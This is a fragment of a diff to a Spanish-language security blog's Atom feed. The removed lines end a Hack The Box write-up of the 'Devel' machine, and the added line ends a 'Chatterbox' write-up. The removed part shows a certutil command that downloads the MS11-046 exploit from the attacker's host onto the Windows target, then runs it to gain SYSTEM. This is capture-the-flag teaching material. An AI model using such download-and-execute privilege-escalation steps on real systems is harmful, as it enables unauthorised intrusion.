-10.10.10.5 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;28/Aug/2021 17:28:26] &lt;span class=&quot;s2&quot;&gt;&quot;GET /ms11-046.exe HTTP/1.1&quot;&lt;/span&gt; 200 -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp                                                                                                                         
-&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;Privesc                                                                     
-&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;Privesc                                                                                                         
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Privesc                              
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Privesc                                                                                 
-certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.15/ms11-046.exe C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&lt;span class=&quot;se&quot;&gt;\m&lt;/span&gt;s11-046.exe
-&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;  Online  &lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;
-  000000  ...
-  01b8af
-CertUtil: &lt;span class=&quot;nt&quot;&gt;-URLCache&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully.
-
-&lt;span class=&quot;nb&quot;&gt;dir
-dir
- &lt;/span&gt;Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
- Volume Serial Number is 8620-71F1
-
- Directory of C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc
-
-29/08/2021  01:33     &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-29/08/2021  01:33     &amp;lt;DIR&amp;gt;          ..
-29/08/2021  01:33            112.815 ms11-046.exe
-               1 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        112.815 bytes
-               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  22.117.363.712 bytes free
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rivesc&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos el archivo ms11-046.exe y ya somos adminstradores del sistema, ahora podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ms11-046.exe
-
-&lt;span class=&quot;nb&quot;&gt;whoami
-whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-
-c:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ystem32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="FTP" /><category term="Arbitrary_File_ Upload" /><summary type="html">Resolución de la máquina Devel en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Powershell" /><summary type="html">Resolución de la máquina Chatterbox en la plataforma de Hack The Box</summary></entry></feed>
